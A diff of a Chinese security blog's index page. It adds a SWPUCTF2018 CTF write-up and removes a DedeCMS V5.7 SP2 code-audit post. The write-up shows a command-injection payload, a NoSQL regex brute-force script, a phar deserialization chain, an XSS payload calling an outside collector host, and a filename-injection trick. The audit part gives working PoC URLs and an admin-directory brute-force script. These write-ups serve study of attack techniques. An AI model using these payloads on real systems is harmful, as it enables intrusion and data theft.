@@ -90,6 +90,204 @@
     
         <article class="post">
             <h1>
+                <a class="title" href="/2018/12/20/SWPUCTF2018 Write up/"> 
+                    SWPUCTF2018 Write up 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2018-12-20   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <p>恰逢复习期，也没什么事，打一场SWPUCTF来放松一下，感谢西油出题师傅。最后狗了个第十二名，顺便吐槽一下队友起的什么智障名字。。<br><img src="https://i.loli.net/2018/12/20/5c1b02a394512.png" alt></p>
+<h1 id="SWPUCTF2018"><a href="#SWPUCTF2018" class="headerlink" title="SWPUCTF2018"></a>SWPUCTF2018</h1><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="PCAP"><a href="#PCAP" class="headerlink" title="PCAP"></a>PCAP</h2><p>签到题，流量包拖wireshark追TCP包</p>
+<h2 id="床前明月光-低头…"><a href="#床前明月光-低头…" class="headerlink" title="床前明月光,低头…"></a>床前明月光,低头…</h2><p>低头看键盘</p>
+<pre><code>99 9 9 88 11 5 5 66 3 88 3 6 555 9 11 4 33</code></pre><p>键盘密码 99就代表9那列的第二个值</p>
+<p>look ….. 依次读就行了</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="用优惠码买个X"><a href="#用优惠码买个X" class="headerlink" title="用优惠码买个X"></a>用优惠码买个X</h2><p>拿到题目扫目录 <a href="http://www.zip" target="_blank" rel="noopener">www.zip</a><br>源码如下</p>
+<pre><code>$_SESSION[&#39;seed&#39;]=rand(0,999999999);
+function youhuima(){
+    mt_srand($_SESSION[&#39;seed&#39;]);
+    $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
+    $auth=&#39;&#39;;
+    $len=15;
+    for ( $i = 0; $i &lt; $len; $i++ ){
+        if($i&lt;=($len/2))
+              $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);
+        else
+              $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);
+    }
+    setcookie(&#39;Auth&#39;, $auth);
+}
+//support
+    if (preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip)){
+        if (!preg_match(&quot;/\?|flag|}|cat|echo|\*/i&quot;,$ip)){
+               //执行命令
+        }else {
+              //flag字段和某些字符被过滤!
+        }
+    }else{
+             // 你的输入不正确!
+    }
+?&gt;</code></pre><p>根据提示应该分两部分  绕过优惠码-&gt;命令执行逃过</p>
+<p>首先说破解优惠码，登陆时session产生0-99999999随机数为种子，通过mt_srand()种下随机数种子，mt_rand()来获取这个随机数。</p>
+<p>这里mt_srand伪随机，具体机制可以看这篇文章：<a href="http://wonderkun.cc/index.html/?p=585%EF%BC%8C%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%89%8D%E4%B9%9F%E6%98%AFctf%E7%9A%84%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF" target="_blank" rel="noopener">http://wonderkun.cc/index.html/?p=585%EF%BC%8C%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%89%8D%E4%B9%9F%E6%98%AFctf%E7%9A%84%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF</a></p>
+<p>种子不变，生成的随机数就不变</p>
+<p>所以通过前15位随机数，破解种子，根据种子再生成24位的随机数，也就是我们的优惠码</p>
+<p>脚本跑随机数在字符串的位置：</p>
+<pre><code>&lt;?php
+$str = &quot;lP9DUJjQ&quot;;
+$randStr = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
+
+for($i=0;$i&lt;strlen($str);$i++){
+   $pos = strpos($randStr,$str[$i]);
+   echo $pos.&quot; &quot;.$pos.&quot; &quot;.&quot;0 &quot;.(strlen($randStr)-1).&quot; &quot;;
+   //整理成方便 php_mt_seed 测试的格式
+  //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]
+}
+echo &quot;\n&quot;;
+?&gt;</code></pre><p>这个的坑点，必须跑前八位优惠码，因为算法里后起位和前八位生成顺序不一样</p>
+<p>用工具php_mt_seed跑一下<br><img src="https://i.loli.net/2018/12/20/5c1af5f2cb05b.png" alt></p>
+<p>本地php7环境跑这个种子的24位就能得到优惠码了</p>
+<p>优惠码成功跳转到命令执行whois查询，匹配ip时用了/m  且^ $必须匹配头尾，%0a换行绕过检测，0a后面写规范ip</p>
+<p>过滤了查询flag的语句，用”” 或者\绕过都行</p>
+<p>完整payload:</p>
+<pre><code>ca\t /f\lag%0a127.0.0.1</code></pre><h2 id="Injection"><a href="#Injection" class="headerlink" title="Injection ???"></a>Injection ???</h2><p>扫目录用个info.php</p>
+<p>是个phpinfo然后拓展显示mongo的数据库，搭配题目叫注入，那应该是一个nosql注入了</p>
+<p>思路很简单，用通配符猜解admin的密码</p>
+<pre><code>username=admin&amp;password[$regex]=^**</code></pre><p>只不过要写个脚本跑验证码，这里队友写了一个提供参考</p>
+<pre><code>import requests
+import time
+import pytesseract
+from PIL import Image
+import os
+from urllib.request import urlretrieve
+
+j=0
+passw0rd = [&quot;s&quot;,&quot;k&quot;,&quot;m&quot;,&quot;u&quot;,&quot;n&quot;]
+payload=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_!@#$%&quot;
+url = &quot;http://123.206.213.66:45678/check.php?username=admin&amp;password[$regex]=^skmun{}&amp;vertify={}&quot;
+img_url = &#39;http://123.206.213.66:45678/vertify.php&#39;
+
+for i in range(1,20):
+    while j&lt;len(payload):
+        s = requests.session()
+        payloads = payload[j]
+        with open(r&#39;C:\Users\asus\Desktop\image\img1.png&#39;,&#39;wb&#39;) as fd:
+            img_1 = s.get(url=img_url)
+            fd.write(img_1.content)
+        image = Image.open(r&#39;C:\Users\asus\Desktop\image\img1.png&#39;)
+        vcode = pytesseract.image_to_string(image)
+        url_1 = url.format(str(payloads),vcode)
+        r = s.get(url_1,cookies=img_1.cookies)
+        print(r.text)
+        if &quot;wrong CAPTCHA!&quot; in r.text:
+            continue
+        if &quot;username or password incorrect!&quot; in r.text:
+            print(payloads)
+            j = j+1
+            break
+        if &quot;Nice!But it is not the real passwd&quot; in r.text:
+            passw0rd.append(payloads)
+            print(&quot;passw0rd is :&quot; + str(passw0rd))
+            j = j+1
+            break</code></pre><h2 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h2><p>题目地址：</p>
+<p>file有个代码高亮的功能，把这些页面的额源码都Down一下</p>
+<p>先看一下test类的__get()方法<br><img src="https://i.loli.net/2019/01/17/5c4024d7a5bbf.png" alt><br><img src="https://i.loli.net/2019/01/17/5c4024d7a663a.png" alt></p>
+<p>__get()方法用于输出一个不可访问变量的值，<strong>不可访问不仅仅是protected和private，还有不存在的变量也属于不可访问，这点很重要</strong>。$key的值就是不可访问的参数名，这里是”source”，如果输入”xx”，echo的就是xx。</p>
+<p>开发角度来讲，私有属性一般都会调用__get()方法用以提供外界访问。继续看下面的代码</p>
+<pre><code>    public function get($key)
+    {
+        if(isset($this-&gt;params[$key])) {
+            $value = $this-&gt;params[$key];      
+        } else {
+            $value = &quot;index.php&quot;;
+        }
+        return $this-&gt;file_get($value);  
+    }
+    public function file_get($value)
+    {
+        $text = base64_encode(file_get_contents($value));
+        return $text;
+    }</code></pre><p>通过调用get()方法获取params数组里的值，进而获取这个值所对应的文件内容，这为获取flag文件内容做了铺垫。</p>
+<p>所以只需要想办法使$this-&gt;params[$key] =  ‘/var/www/html/f1ag.php’</p>
+<h3 id="瓶颈"><a href="#瓶颈" class="headerlink" title="瓶颈"></a>瓶颈</h3><p>一开始我是这样构造的攻击链：<br><img src="https://i.loli.net/2018/12/20/5c1b0f967a20a.png" alt></p>
+<p>之前分析过phar，它在反序列化的时候不会执行构造函数即construct，所以置空参数，让test类的get方法返回文件内容，再通过c1e4r类的echo输出到页面上</p>
+<p>但是这里有一个问题，phar序列化的时候， 不会把类的方法反序列化，所以只能控类的成员。那么就开始下面的方法：</p>
+<h3 id="正确的思路"><a href="#正确的思路" class="headerlink" title="正确的思路"></a>正确的思路</h3><pre><code>$a = new Test();
+$a-&gt;params = [
+    &#39;source&#39; =&gt; &#39;/var/www/html/f1ag.php&#39;
+];
+
+$b = new Show();
+$b-&gt;str[&#39;str&#39;] = $a;
+
+$c = new C1e4r();
+$c-&gt;str = $b;</code></pre><p>思路就是：<br>我们用test类来获取f1ag.php里的内容，返回给$content(Show类)，$content的值再返回给C1e4r类的echo输出</p>
+<p>C1e4r调用echo，而echo可以执行toString方法，所以我们让echo的值为我们要控的toString方法对应的类即show类的对象</p>
+<h2 id="有趣的邮箱注册"><a href="#有趣的邮箱注册" class="headerlink" title="有趣的邮箱注册"></a>有趣的邮箱注册</h2><p>网站功能很少：提交邮箱地址-&gt;管理审核邮箱</p>
+<p>给了hint:</p>
+<pre><code>&lt;!--check.php
+if($_POST[&#39;email&#39;]) {
+$email = $_POST[&#39;email&#39;];
+if(!filter_var($email,FILTER_VALIDATE_EMAIL)){
+echo &quot;error email, pleduase check your email&quot;;
+}else{
+echo &quot;等待管理员自动审核&quot;;edit/5c1a5a3a38649f668227c9fd
+echo $email;
+}
+}
+?&gt;
+--&gt;</code></pre><p>之前有个红日审计项目，关于filter_var()匹配email的漏洞进行了剖析:<a href="https://xz.aliyun.com/t/2501" target="_blank" rel="noopener">https://xz.aliyun.com/t/2501</a></p>
+<p>大致就是单引号双引号重叠，用\可以绕过空格，</p>
+<p>然后我尝试了一下注入scirpt标签提交..尼玛直接成功了…<br><img src="https://i.loli.net/2018/12/20/5c1af8b853c84.jpg" alt></p>
+<pre><code>email=&quot;\ &lt;sCRiPt\ sRC=https://unazizi.exeye.io/swctf&gt;&lt;/sCrIpT&gt;\ &quot;@aa.com</code></pre><p>那它的意思应该是后台管理员会随时点击这个email，就触发了xss</p>
+<p>因为打不到管理员的cookie，就打admin.php的页面源码了<br><img src="https://i.loli.net/2018/12/20/5c1af977078cf.jpg" alt></p>
+<p>发现后台会跳到：<code>/admin/a0a.php?cmd=whoami</code></p>
+<p>明显RCE，直接请求到这个url，发现出题人设置了本地，且匹配IP用的是 remote_addr，也就是说无法伪装IP</p>
+<p>后台Bot一直会请求admin.php这个页面，xss 改变它请求的参数，让本地管理员帮我们执行这个命令</p>
+<p>用XHR发送请求或者Location重定向都可以</p>
+<p>反弹Shell后发现还有题目，后台有个上传页面和备份页面，其中backup.php可读内容如下</p>
+<pre><code>&lt;?phpinclude(&quot;upload.php&quot;);
+echo &quot;上传目录：&quot; . $upload_dir . &quot;&lt;br /&gt;&quot;;
+$sys = &quot;tar -czf z.tar.gz *&quot;;
+chdir($upload_dir);
+system($sys);
+if(file_exists(&#39;z.tar.gz&#39;)){
+        echo &quot;上传目录下的所有文件备份成功!&lt;br /&gt;&quot;;
+        echo &quot;备份文件名: z.tar.gz&quot;;
+}else{
+        echo &quot;未上传文件，无法备份！&quot;;
+}
+?&gt;</code></pre><p>也就是说它会备份我们上传目录下的所有文件，即*</p>
+<p>上传一些文件名例如<code>| echo &quot;123&quot;&gt;123.php</code></p>
+<p>System 就会执行拼接后的$sys</p>
+<p>当时题目坏了，出题师傅跟我说直接再弹一个shell，就可以拿到flag权限。。</p>
+<p>然后直接给我了flag…2333…</p>
+<h1 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h1><p>这次比赛是西南石油师傅举办的公益性比赛..觉得他们确实挺不容易的，学院不支持+自掏腰包办比赛，但是赛题质量都还不错，可见师傅们的用心，给个好评！</p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2018/12/20/SWPUCTF2018 Write up/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
                 <a class="title" href="/2018/12/17/HCTF2018线下赛感想/"> 
                     HCTF2018线下赛感想 
                 </a>
@@ -973,262 +1171,6 @@ xdebug.idekey = PHPSTORM</code></pre><p>zend_extension：插件地址<br>xdebug.
             </div>
             <div class="continue">
             <a href="/2018/08/23/Arbitrary File upload in Semcms V2.7/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2018/08/21/Dedecms V5.7 SP2代码审计/"> 
-                    Dedecms V5.7 SP2代码审计 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2018-08-21   
-                </a>
-                
-                <a class="category">
-                    <i class="fa fa-th" aria-hidden="true"></i>  
-                </a>
-               
-                <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/">代码审计</a></li></ul>
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>首发于安全客：<a href="https://www.anquanke.com/post/id/157522" target="_blank" rel="noopener">代码审计入门级DedecmsV5.7 SP2分析复现</a></p>
-<h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p>Dedecms的洞有很多，而最新版的v5.7 sp2更新止步于1月。作为一个审计小白,看过《代码审计-企业级Web代码安全构架》后，偶然网上冲浪看到mochazz师傅在blog发的审计项目,十分有感触。跟着复现了两个dedecms代码执行的cve,以一个新手的视角重新审视这些代码，希望文章可以帮助像我这样入门审计不久的表哥们。文章若有片面或不足的地方还请师傅们多多斧正</p>
-<h2 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h2><p>php5.45 + mysql<br>审计对象：DedeCMS V5.7 SP2<br>工具：seay源码审计</p>
-<h2 id="后台代码执行"><a href="#后台代码执行" class="headerlink" title="后台代码执行"></a>后台代码执行</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>DedeCMS V5.7 SP2版本中tpl.php存在代码执行漏洞，攻击者可利用该漏洞在增加新的标签中上传木马，获取webshell</p>
-<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>漏洞位置：dede/tpl.php</p>
-<p>看一下核心代码：</p>
-<pre><code># /dede/tpl.php
-&lt;?php
-require_once(dirname(__FILE__).&quot;/config.php&quot;);
-CheckPurview(&#39;plus_文件管理器&#39;);
-
-$action = isset($action) ? trim($action) : &#39;&#39;;
-......
-if(empty($filename))    $filename = &#39;&#39;;
-$filename = preg_replace(&quot;#[\/\\\\]#&quot;, &#39;&#39;, $filename);
-......
-else if($action==&#39;savetagfile&#39;)
-{
-    csrf_check();
-    if(!preg_match(&quot;#^[a-z0-9_-]{1,}\.lib\.php$#i&quot;, $filename))
-    {
-        ShowMsg(&#39;文件名不合法，不允许进行操作！&#39;, &#39;-1&#39;);
-        exit();
-    }
-    require_once(DEDEINC.&#39;/oxwindow.class.php&#39;);
-    $tagname = preg_replace(&quot;#\.lib\.php$#i&quot;, &quot;&quot;, $filename);
-    $content = stripslashes($content);
-    $truefile = DEDEINC.&#39;/taglib/&#39;.$filename;
-    $fp = fopen($truefile, &#39;w&#39;);
-    fwrite($fp, $content);
-    fclose($fp);
-    ......
-}</code></pre><p>因为dedecms全局变量注册(register_globals=on)，这里有两个可控变量$filename&amp;$content</p>
-<p>action=savetag时，进行csrf()检测</p>
-<pre><code>function csrf_check()
-{
-    global $token;
-
-    if(!isset($token) || strcasecmp($token, $_SESSION[&#39;token&#39;]) != 0){
-        echo &#39;&lt;a href=&quot;http://bbs.dedecms.com/907721.html&quot;&gt;DedeCMS:CSRF Token Check Failed!&lt;/a&gt;&#39;;
-        exit;
-    }
-}</code></pre><p>验证token和已知的session是否相等，那么token的值从何获取呢？</p>
-<p>回溯tpl.php，追踪一下token：</p>
-<pre><code>else if ($action == &#39;upload&#39;)
-{
-        ....
-        &lt;input name=&#39;acdir&#39; type=&#39;hidden&#39; value=&#39;$acdir&#39;  /&gt;
-        &lt;input name=&#39;token&#39; type=&#39;hidden&#39; value=&#39;{$_SESSION[&#39;token&#39;]}&#39;  /&gt;
-        &lt;input name=&#39;upfile&#39; type=&#39;file&#39; id=&#39;upfile&#39; style=&#39;width:380px&#39; /&gt;
-}</code></pre><p>当action=upload时，隐藏表单的value提交token值<br><img src="https://s1.ax1x.com/2018/08/21/PIOS7n.png" alt></p>
-<p>token搞定了，再让我们继续往下审~</p>
-<pre><code>$truefile = DEDEINC.&#39;/taglib/&#39;.$filename;</code></pre><p>传入的filename必须为 xxxx.lib.php，并且保存的也是php文件</p>
-<pre><code>    fwrite($fp, $content);
-    fclose($fp);</code></pre><p>写入内容为$content…那岂不是为所欲为..<br>poc:</p>
-<pre><code>http://localhost/dedecms/uploads/dede/tpl.php?action=savetagfile&amp;filename=hpdoger.lib.php&amp;content=&lt;?php phpinfo();?&gt;&amp;token=55f2eb0ad241e1893276ed1f8e7dd5fa</code></pre><p>在include/taglib下会产生相应xxx.lib.php</p>
-<h2 id="后台代码执行Getshell"><a href="#后台代码执行Getshell" class="headerlink" title="后台代码执行Getshell"></a>后台代码执行Getshell</h2><h3 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h3><p>问题代码位于：/uploads/plus/ad_js.php</p>
-<pre><code> */
-require_once(dirname(__FILE__).&quot;/../include/common.inc.php&quot;);
-
-if(isset($arcID)) $aid = $arcID;
-$arcID = $aid = (isset($aid) &amp;&amp; is_numeric($aid)) ? $aid : 0;
-if($aid==0) die(&#39; Request Error! &#39;);
-
-$cacheFile = DEDEDATA.&#39;/cache/myad-&#39;.$aid.&#39;.htm&#39;;
-if( isset($nocache) || !file_exists($cacheFile) || time() - filemtime($cacheFile) &gt; $cfg_puccache_time )
-{
-    $row = $dsql-&gt;GetOne(&quot;SELECT * FROM `#@__myad` WHERE aid=&#39;$aid&#39; &quot;);
-    $adbody = &#39;&#39;;
-    if($row[&#39;timeset&#39;]==0)
-    {
-        $adbody = $row[&#39;normbody&#39;];
-    }
-    else
-    {
-        $ntime = time();
-        if($ntime &gt; $row[&#39;endtime&#39;] || $ntime &lt; $row[&#39;starttime&#39;]) {
-            $adbody = $row[&#39;expbody&#39;];
-        } else {
-            $adbody = $row[&#39;normbody&#39;];
-        }
-    }
-    $adbody = str_replace(&#39;&quot;&#39;, &#39;\&quot;&#39;,$adbody);
-    $adbody = str_replace(&quot;\r&quot;, &quot;\\r&quot;,$adbody);
-    $adbody = str_replace(&quot;\n&quot;, &quot;\\n&quot;,$adbody);
-    $adbody = &quot;&lt;!--\r\ndocument.write(\&quot;{$adbody}\&quot;);\r\n--&gt;\r\n&quot;;
-    $fp = fopen($cacheFile, &#39;w&#39;);
-    fwrite($fp, $adbody);
-    fclose($fp); 
-}
-include $cacheFile;</code></pre><p>摘出关键语句：</p>
-<pre><code>if( isset($nocache) || !file_exists($cacheFile) || time() - filemtime($cacheFile) &gt; $cfg_puccache_time )</code></pre><p>要求$nocache存在，又可以利用前面的全局变量注册</p>
-<p>往下走Getone()函数进行sql查询，返回一个结果集。</p>
-<p>而后把取到的值和当前的时间点对比作为判断条件，决定取表中的normbody还是exbody赋值给$adbody。</p>
-<p>接着就比较明朗了..将$adbody写入文件，而文件名我们抓包应该就可以知道。</p>
-<p>但是这里我只看了这一个文件，现在整理一下思路：<br>1、给出一个$aid进行sql查询<br>2、根据查询值判断\写文件，且文件内容可控，目录已知<br>3、最后把写入的文件包含进来。</p>
-<p>那么，我们这个$aid从何处传入数据库呢？随着这个思路追踪文件到：/dede/ad_add.php</p>
-<p>一个编辑页面，抓包看一下键值对应，顺便瞅一眼mysql载入的数据<br><img src="https://s1.ax1x.com/2018/08/22/PTGGdO.jpg" alt><br>看到这里知道，清楚exbody和normbody对应的都是什么了</p>
-<p>依据代码<code>$row = $dsql-&gt;GetOne(&quot;SELECT * FROM `#@__myad` WHERE aid=&#39;$aid&#39; &quot;);</code>查看dede__myad这个库插入的内容：<br><img src="https://s1.ax1x.com/2018/08/22/PTGJoD.png" alt></p>
-<p>看到timeset=0，那么直接是取<code>$adbody = $row[&#39;normbody&#39;];</code>其实timeset何时都为0，浏览ad_add.php代码部分看到，存入数据库的timeset值就为0</p>
-<p>ok 现在思路明确,开始复现</p>
-<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>我们已经保存过一个页面了，直接poke一下<code>http://localhost/dedecms/uploads/plus/ad_js.php?aid=1</code>看看<br><img src="https://s1.ax1x.com/2018/08/22/PTGtFe.png" alt></p>
-<p>查看写入文件：<code>http://localhost/dedecms/uploads/data/cache/myad-1.htm</code><br><img src="https://s1.ax1x.com/2018/08/22/PTGUWd.png" alt></p>
-<p>htm文件成功写入，我们回到Ad_js来执行一下任意代码。不要忘记闭合前面的document文档注释语句<br>payload:</p>
-<pre><code>hpdoger=echo &#39;--&gt;&#39;; phpinfo();</code></pre><p><img src="https://s1.ax1x.com/2018/08/22/PTGwQI.jpg" alt></p>
-<h2 id="winapi查找后台目录"><a href="#winapi查找后台目录" class="headerlink" title="winapi查找后台目录"></a>winapi查找后台目录</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>1、win系统下搭建的网站<br>2、网站后台目录存在/images/adminico.gif</p>
-<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>windows环境下查找文件基于Windows FindFirstFile的winapi函数，该函数到一个文件夹(包括子文件夹) 去搜索指定文件。</p>
-<p>利用方法很简单，我们只要将文件名不可知部分之后的字符用“&lt;”或者“&gt;”代替即可，不过要注意的一点是，只使用一个“&lt;”或者“&gt;”则只能代表一个字符，如果文件名是12345或者更长，这时候请求“1&lt;”或者“1&gt;”都是访问不到文件的，需要“1&lt;&lt;”才能访问到，代表继续往下搜索，有点像Windows的短文件名，这样我们还可以通过这个方式来爆破目录文件了。</p>
-<h3 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h3><p>核心文件：common.inc.php</p>
-<pre><code>if($_FILES)
-{
-    require_once(DEDEINC.&#39;/uploadsafe.inc.php&#39;);
-}</code></pre><p>追踪uploadsafe.inc.php</p>
-<pre><code>if( preg_match(&#39;#^(cfg_|GLOBALS)#&#39;, $_key) )
-{
-    exit(&#39;Request var not allow for uploadsafe!&#39;);
-}
-$$_key = $_FILES[$_key][&#39;tmp_name&#39;]; //获取temp_name 
-${$_key.&#39;_name&#39;} = $_FILES[$_key][&#39;name&#39;];
-${$_key.&#39;_type&#39;} = $_FILES[$_key][&#39;type&#39;] = preg_replace(&#39;#[^0-9a-z\./]#i&#39;, &#39;&#39;, $_FILES[$_key][&#39;type&#39;]);
-${$_key.&#39;_size&#39;} = $_FILES[$_key][&#39;size&#39;] = preg_replace(&#39;#[^0-9]#&#39;,&#39;&#39;,$_FILES[$_key][&#39;size&#39;]);
-if(!empty(${$_key.&#39;_name&#39;}) &amp;&amp; (preg_match(&quot;#\.(&quot;.$cfg_not_allowall.&quot;)$#i&quot;,${$_key.&#39;_name&#39;}) || !preg_match(&quot;#\.#&quot;, ${$_key.&#39;_name&#39;})) )
-{
-    if(!defined(&#39;DEDEADMIN&#39;))
-    {
-        exit(&#39;Not Admin Upload filetype not allow !&#39;);
-    }
-}
-if(empty(${$_key.&#39;_size&#39;}))
-{
-    ${$_key.&#39;_size&#39;} = @filesize($$_key);
-}
-$imtypes = array
-(
-    &quot;image/pjpeg&quot;, &quot;image/jpeg&quot;, &quot;image/gif&quot;, &quot;image/png&quot;, 
-    &quot;image/xpng&quot;, &quot;image/wbmp&quot;, &quot;image/bmp&quot;
-);
-if(in_array(strtolower(trim(${$_key.&#39;_type&#39;})), $imtypes))
-{
-    $image_dd = @getimagesize($$_key); 
-    //问题就在这里，获取文件的size，获取不到说明不是图片或者图片不存在，不存就exit upload.... ,利用这个逻辑猜目录的前提是目录内有图片格式的文件。
-    if (!is_array($image_dd))
-    {
-        exit(&#39;Upload filetype not allow !&#39;);
-    }
-}</code></pre><p>摘出这句：</p>
-<pre><code> $image_dd = @getimagesize($$_key); </code></pre><p>进行判断$$_key是否为图片或图片是否存在</p>
-<p>然而$$_key的来源是$_FILES[$_key][‘tmp_name’]，上文说了全局变量注册，$FILE可控，那我们传入一个$_FILES[$_key][‘tmp_name’]亦可控，此处是产生了一个变量覆盖的</p>
-<p>接着再看同文件的代码</p>
-<pre><code>    ${$_key.&#39;_name&#39;} = $_FILES[$_key][&#39;name&#39;];
-    ${$_key.&#39;_type&#39;} = $_FILES[$_key][&#39;type&#39;] = preg_replace(&#39;#[^0-9a-z\./]#i&#39;, &#39;&#39;, $_FILES[$_key][&#39;type&#39;]);
-    ${$_key.&#39;_size&#39;} = $_FILES[$_key][&#39;size&#39;] = preg_replace(&#39;#[^0-9]#&#39;,&#39;&#39;,$_FILES[$_key][&#39;size&#39;]);
-
-    if(!empty(${$_key.&#39;_name&#39;}) &amp;&amp; (preg_match(&quot;#\.(&quot;.$cfg_not_allowall.&quot;)$#i&quot;,${$_key.&#39;_name&#39;}) || !preg_match(&quot;#\.#&quot;, ${$_key.&#39;_name&#39;})) )
-    {
-        if(!defined(&#39;DEDEADMIN&#39;))
-        {
-            exit(&#39;Not Admin Upload filetype not allow !&#39;);
-        }
-    }</code></pre><p>其中,$cfg_not_allowall的范围如下：</p>
-<pre><code>$cfg_not_allowall = &quot;php|pl|cgi|asp|aspx|jsp|php3|shtm|shtml&quot;;</code></pre><p>既然上传的name不让以这些结尾，那么我们查.gif不过分吧</p>
-<p>找一处验证以下这个核心文件产生的小漏洞：<br><img src="https://s1.ax1x.com/2018/08/21/PIOPhV.png" alt><br><img src="https://s1.ax1x.com/2018/08/21/PIOk1U.png" alt></p>
-<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><pre><code>_FILES[hpdoger][tmp_name]=./ded&lt;&lt;/images/adminico.gif&amp;_FILES[hpdoger][name]=0&amp;_FILES[hpdoger][size]=0&amp;_FILES[hpdoger][type]=image/gif</code></pre><p>这个poc根据mochazz师傅的poc练手写的，膜mochazz师傅~：</p>
-<pre><code># -*- coding: utf-8 -*-
-from itertools import permutations
-import requests
-
-def guess_back_dir(url,data,characters):
-    for num in range(1,5):
-        for every in permutations(characters,num):
-            payload = &#39;&#39;.join(every)
-            data[&quot;_FILES[hpdoger][tmp_name]&quot;] = data[&quot;_FILES[hpdoger][tmp_name]&quot;].format(p = payload)
-            print(&quot;testing:&quot;,payload)
-            r = requests.post(url,data = data)
-            if find_page(r) &gt; 0:
-                print(&quot;back_dir:[+]&quot;,payload)
-                data[&quot;_FILES[hpdoger][tmp_name]&quot;] = &quot;./{p}&lt;&lt;/images/adminico.gif&quot;
-                return payload
-            data[&quot;_FILES[hpdoger][tmp_name]&quot;] = &quot;./{p}&lt;&lt;/images/adminico.gif&quot;
-
-def guess_rest_dir(back_dir,url,data,characters):
-    while True:
-        for singel in characters:
-            if singel != characters[-1]:
-                data[&quot;_FILES[hpdoger][tmp_name]&quot;] = data[&quot;_FILES[hpdoger][tmp_name]&quot;].format(p=back_dir + singel)
-                r = requests.post(url,data = data)
-                # print data
-                if find_page(r) &gt; 0:
-                    print(&quot;guess successfully[+]:&quot;,back_dir)
-                    back_dir += singel
-                    data[&quot;_FILES[hpdoger][tmp_name]&quot;] = &quot;./{p}&lt;&lt;/images/adminico.gif&quot;
-                    break
-                data[&quot;_FILES[hpdoger][tmp_name]&quot;] = &quot;./{p}&lt;&lt;/images/adminico.gif&quot;
-            else:
-                return  back_dir
-
-def find_page(response):
-    if &quot;Upload filetype not allow !&quot; not in response.text and response.status_code == 200:
-        return 1
-
-def main():
-    characters = &quot;abcdefghijklmnopqrstuvwxyz0123456789_!#&quot;
-    url = raw_input(&quot;Please input your target:&quot;)
-    data = {
-        &quot;_FILES[hpdoger][tmp_name]&quot;: &quot;./{p}&lt;&lt;/images/adminico.gif&quot;,
-        &quot;_FILES[hpdoger][name]&quot;: 0,
-        &quot;_FILES[hpdoger][size]&quot;: 0,
-        &quot;_FILES[hpdoger][type]&quot;: &quot;image/gif&quot;
-    }
-
-    back_dir = guess_back_dir(url,data,characters)
-    name = guess_rest_dir(back_dir,url,data,characters)
-    print(&quot;The background address is[+]:&quot;,name)
-
-
-if __name__ == &#39;__main__&#39;:
-    main()</code></pre><h3 id="最后穿插一个关于FILE变量的小知识点"><a href="#最后穿插一个关于FILE变量的小知识点" class="headerlink" title="最后穿插一个关于FILE变量的小知识点"></a>最后穿插一个关于FILE变量的小知识点</h3><p>$_FILES[“file”][“name”] - 被上传文件的名称<br>$_FILES[“file”][“type”] - 被上传文件的类型<br>$_FILES[“file”][“size”] - 被上传文件的大小，以字节计<br>$_FILES[“file”][“tmp_name”] - 存储在服务器的文件的临时副本的名称<br>$_FILES[“file”][“error”] - 由文件上传导致的错误代码</p>
